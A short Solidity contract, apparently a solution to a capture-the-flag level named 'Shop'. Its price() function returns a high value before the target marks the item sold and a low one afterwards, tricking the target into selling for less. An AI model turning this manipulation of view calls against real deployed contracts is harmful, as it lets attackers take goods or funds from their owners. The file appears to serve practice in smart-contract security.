// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

/* interface Shop {
  function buy() external;
  function isSold() external view returns (bool);
} */


contract Buyer {

Shop public shoppy;

constructor (address _shopAddress) public {
    shoppy = Shop(_shopAddress);
}

bool public toggle = true;


    function price() public view returns (uint) {

        if (!shoppy.isSold()) {
            return 100;
        } else {
            return 1;
        }
    }

    function callShop(address _addr) public {
        shoppy.buy();
    }


    function returnIsSold() public view returns (bool) {
        Shop shop = Shop(shoppy);
        return shop.isSold();
    }


// EXTRA


}